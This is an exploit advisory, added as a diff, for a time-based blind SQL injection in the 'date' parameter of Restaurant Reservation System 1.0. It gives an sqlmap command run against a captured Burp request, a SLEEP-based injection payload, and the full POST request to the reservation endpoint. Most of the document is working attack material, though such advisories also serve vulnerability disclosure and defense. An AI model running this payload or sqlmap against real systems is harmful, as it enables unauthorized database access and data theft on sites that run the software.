@@ -1,0 +1,56 @@
+# Exploit Title: Restaurant Reservation System 1.0 - 'date' SQL Injection (Authenticated)
+# Date: 2020-10-05
+# Exploit Author: b1nary
+# Vendor Homepage: https://www.sourcecodester.com/php/14482/restaurant-reservation-system-php-full-source-code-2020.html
+# Software Link: https://www.sourcecodester.com/sites/default/files/download/janobe/restaurants_3.zip
+# Version: 1.0
+# Tested on: Linux + Apache2
+
+------------------------------------------------------------------------------------
+
+1. Description:
+----------------------
+
+Restaurant Reservation System 1.0 allows SQL Injection via parameter 'date' in
+includes/reservation.inc.php. Exploiting this issue could allow an attacker to compromise
+the application, access or modify data, or exploit latent vulnerabilities
+in the underlying database.
+
+
+2. Proof of Concept:
+----------------------
+
+In Burpsuite intercept the request from the affected page with
+'date' parameter and save it like re.req. Then run SQLmap to extract the
+data from the database:
+
+sqlmap -r re.req --dbms=mysql
+
+
+3. Example payload:
+----------------------
+
+(time-based blind)
+
+fname=user&lname=user&date=2020-10-14' AND (SELECT 1934 FROM (SELECT(SLEEP(5)))lmWi) AND 
+'navS'='navS&time=16:00 - 20:00&num_guests=2&tele=123456789&comments=null&reserv-submit=
+
+
+4. Burpsuite request:
+----------------------
+
+POST /restaurant/includes/reservation.inc.php HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+Origin: http://127.0.0.1
+DNT: 1
+Connection: close
+Referer: http://127.0.0.1/restaurant/reservation.php
+Cookie: PHPSESSID=r355njdkuddu4ac0a784i9i69m
+Upgrade-Insecure-Requests: 1
+
+fname=user&lname=user&date=2020-10-14&time=16%3A00+-+20%3A00&num_guests=2&tele=123456789&comments=null&reserv-submit=
